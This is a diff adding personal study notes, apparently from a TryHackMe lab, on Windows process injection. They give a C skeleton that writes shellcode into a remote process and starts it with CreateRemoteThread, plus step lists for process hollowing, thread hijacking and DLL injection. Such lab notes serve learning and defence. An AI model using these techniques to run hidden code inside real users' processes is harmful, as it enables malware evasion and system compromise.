@@ -1,0 +1,88 @@
+### process injection ###
+## links
+https://tryhackme.com/room/abusingwindowsinternals
+
+
+## example
+# open a target process
+processHandle = OpenProcess(
+	PROCESS_ALL_ACCESS, // Defines access rights
+	FALSE, // Target handle will not be inhereted
+	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
+);
+
+# Alloc some memory for shellcode
+remoteBuffer = VirtualAllocEx(
+	processHandle, // Opened target process
+	NULL, 
+	sizeof shellcode, // Region size of memory allocation
+	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
+	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
+);
+
+# write shellcode
+WriteProcessMemory(
+	processHandle, // Opened target process
+	remoteBuffer, // Allocated memory region
+	shellcode, // Data to write
+	sizeof shellcode, // byte size of data
+	NULL
+);
+
+# create remote thread
+remoteThread = CreateRemoteThread(
+	processHandle, // Opened target process
+	NULL, 
+	0, // Default size of the stack
+	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
+	NULL, 
+	0, // Ran immediately after creation
+	NULL
+);
+
+
+
+## process hollowing
+https://tryhackme.com/room/abusingwindowsinternals
+Create a target process in a suspended state.
+Open a malicious image.
+Un-map legitimate code from process memory.
+Allocate memory locations for malicious code and write each section into the address space.
+Set an entry point for the malicious code.
+Take the target process out of a suspended state.
+
+
+## thread hijacking
+Locate and open a target process to control.
+Allocate memory region for malicious code.
+Write malicious code to allocated memory.
+Identify the thread ID of the target thread to hijack.
+Open the target thread.
+Suspend the target thread.
+Obtain the thread context.
+Update the instruction pointer to the malicious code.
+Rewrite the target thread context.
+Resume the hijacked thread.
+
+
+## dll injection
+Locate a target process to inject.
+Open the target process.
+Allocate memory region for malicious DLL.
+Write the malicious DLL to allocated memory.
+Load and execute the malicious DLL.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
